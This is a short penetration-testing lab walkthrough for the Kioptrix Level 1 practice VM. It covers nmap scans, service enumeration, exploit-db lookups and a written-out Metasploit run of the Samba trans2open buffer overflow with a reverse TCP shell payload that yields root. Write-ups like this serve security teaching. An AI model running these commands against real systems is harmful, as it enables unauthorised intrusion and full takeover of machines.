# Kioptrix Level 1 Walkthrough

## Lab Information

Target: Kioptrix Level 1  
Attacker: Kali Linux  
Platform: VMware

---

## Step 1 – Port Scanning

Initial full port scan:

nmap -T4 -p- -n --min-rate 1500 192.168.3.129 -oN ports.txt

Open ports discovered:

22 SSH
80 HTTP
111 RPC
139 SMB
443 HTTPS
32768 Unknown

---

## Step 2 – Service Enumeration

nmap -sC -sV -T4 -p22,80,111,139,443,32768 192.168.3.129 -oN service.txt

Results:

22/tcp OpenSSH 2.9p2
80/tcp Apache httpd 1.3.20
139/tcp Samba 2.2.1a
443/tcp Apache SSL

---

## Step 3 – Vulnerability Research

Apache mod_ssl vulnerability:

https://www.exploit-db.com/exploits/47080

Samba vulnerability:

https://www.exploit-db.com/exploits/22468

---

## Step 4 – Exploit Search

searchsploit samba 2.2

Found exploit:

Samba trans2open remote buffer overflow

---

## Step 5 – Exploitation

Start Metasploit:

msfconsole

Search exploit:

search trans2open

Use module:

use exploit/linux/samba/trans2open

Configure:

set RHOSTS 192.168.3.129
set LHOST 192.168.3.128
set payload linux/x86/shell_reverse_tcp

Run exploit:

run

---

## Step 6 – Shell Access

Command shell opened:

whoami
root

hostname
kioptrix.level1

---

## Conclusion

The target system was vulnerable to a Samba trans2open remote buffer overflow, allowing remote command execution and root access.
